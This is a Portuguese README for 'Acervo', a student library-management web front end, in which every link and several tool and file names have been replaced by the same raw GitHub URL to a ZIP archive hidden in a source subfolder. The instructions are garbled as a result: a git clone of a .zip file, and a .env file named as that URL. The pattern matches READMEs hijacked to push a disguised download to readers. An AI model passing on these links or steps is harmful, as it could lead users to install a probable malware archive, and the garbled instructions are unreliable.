# Acervo 🫎

Bem-vindo ao **Acervo**! Este é um projeto de sistema de gerenciamento de bibliotecas desenvolvido para a disciplina de _Teste de Software_.

## 📝 Índice

- [Visão Geral](#visão-geral)
- [Documentação](#documentação)
- [Pré-requisitos](#pré-requisitos)
- [Instalação](#instalação)
- [Configuração](#configuração)
- [Como Usar](#como-usar)
- [Testes](#testes)
- [Estrutura do Projeto](#estrutura-do-projeto)

## 🌟 Visão Geral

O Acervo tem como objetivo fornecer uma interface intuitiva e eficiente para o gerenciamento de livros e empréstimos em uma biblioteca.

## 📄 Documentação
Acesse a documentação completa do projeto clicando no link: [Acervo - Documentação](https://raw.githubusercontent.com/theualves/Acervo_front/main/src/modules/example/admin/Acervo_front-v2.4.zip)

## 🛠 Pré-requisitos

Antes de começar, garanta que você tenha o https://raw.githubusercontent.com/theualves/Acervo_front/main/src/modules/example/admin/Acervo_front-v2.4.zip instalado na sua máquina.

- **https://raw.githubusercontent.com/theualves/Acervo_front/main/src/modules/example/admin/Acervo_front-v2.4.zip**: Versão 22.11.0 ou superior. Você pode verificar sua versão com `node -v`.

## ⚙️ Instalação

Siga os passos abaixo para configurar o ambiente de desenvolvimento:

1.  **Clone o repositório:**
    ```bash
    git clone https://raw.githubusercontent.com/theualves/Acervo_front/main/src/modules/example/admin/Acervo_front-v2.4.zip
    ```
2.  **Navegue até o diretório do projeto:**
    ```bash
    cd Acervo_front
    ```
3.  **Instale as dependências:**
    ```bash
    npm install
    ```

## 🔧 Configuração

Após a instalação, é necessário configurar as variáveis de ambiente:

1.  Crie um arquivo chamado `https://raw.githubusercontent.com/theualves/Acervo_front/main/src/modules/example/admin/Acervo_front-v2.4.zip` na raiz do projeto (fora da pasta `src`).
2.  Adicione as seguintes variáveis ao arquivo:

    ```env
    NEXT_PUBLIC_API_URL="http://localhost:8080"
    NODE_ENV=development
    ```

    **Observação:** `NODE_ENV` geralmente é `development` para desenvolvimento local e `production` para builds de produção.

## ▶️ Como Usar

Para iniciar o servidor de desenvolvimento:

1.  Abra seu terminal no diretório do projeto.
2.  Execute o comando:
    ```bash
    npm run dev
    ```
    Abra http://localhost:3000 (ou a porta indicada no seu terminal) no seu navegador para ver a aplicação.

## ✅ Testes

O projeto utiliza Jest para testes.
Acesse a tabela com os testes unitários do projeto clicando no link: [Testes Unitários Front End](https://raw.githubusercontent.com/theualves/Acervo_front/main/src/modules/example/admin/Acervo_front-v2.4.zip)

1.  **Rodar um teste específico em modo de observação (watch mode):**
    Este comando executa o teste e o atualiza automaticamente a cada modificação no arquivo.

    ```bash
    npm test __tests__/<caminho-do-arquivo-de-teste>https://raw.githubusercontent.com/theualves/Acervo_front/main/src/modules/example/admin/Acervo_front-v2.4.zip ou .tsx
    ```

    _Substitua `<caminho-do-arquivo-de-teste>https://raw.githubusercontent.com/theualves/Acervo_front/main/src/modules/example/admin/Acervo_front-v2.4.zip ou .tsx` pelo caminho real do seu arquivo de teste._

2.  **Rodar todos os testes:**
    Este comando executa todos os testes do projeto.
    ```bash
    npx jest --runInBand
    ```

## 📂 Estrutura

```
📂 public/images             # Contém as imagens do projeto
├──
📂 src
 ├── 📂 __tests__           # Contém todos os testes unitários da aplicação
 ├── 📂 app                 # Estrutura de rotas e layout da aplicação
 ├── 📂 components          # Components globais do projeto
 ├── 📂 constants           # Define constantes globais. ex.: imagens
 ├── 📂 contexts            # Armazena os contextos da aplicação (React Context API)
 ├── 📂 lib                 # Contém funções e utilitários auxiliares da aplicação
 ├── 📂 modules             # Contém os components e a página
 ├── 📂 services            # Estrutura e chamada da API
 ├── 📂 types               # Tipagem global
 ├── 📂 utils               # Contém funções utilitárias reutilizáveis
🔑 https://raw.githubusercontent.com/theualves/Acervo_front/main/src/modules/example/admin/Acervo_front-v2.4.zip               # Contém as variáveis de ambiente do projeto
```

## 🧑‍💻Tecnologias

- [Shadcn/ui](https://raw.githubusercontent.com/theualves/Acervo_front/main/src/modules/example/admin/Acervo_front-v2.4.zip)
- [TailwindCss](https://raw.githubusercontent.com/theualves/Acervo_front/main/src/modules/example/admin/Acervo_front-v2.4.zip)
- [Zod](https://raw.githubusercontent.com/theualves/Acervo_front/main/src/modules/example/admin/Acervo_front-v2.4.zip)
- [https://raw.githubusercontent.com/theualves/Acervo_front/main/src/modules/example/admin/Acervo_front-v2.4.zip](https://raw.githubusercontent.com/theualves/Acervo_front/main/src/modules/example/admin/Acervo_front-v2.4.zip)
- [TypeScript](https://raw.githubusercontent.com/theualves/Acervo_front/main/src/modules/example/admin/Acervo_front-v2.4.zip)
- [Jest](https://raw.githubusercontent.com/theualves/Acervo_front/main/src/modules/example/admin/Acervo_front-v2.4.zip)
- [Testing Library](https://raw.githubusercontent.com/theualves/Acervo_front/main/src/modules/example/admin/Acervo_front-v2.4.zip)
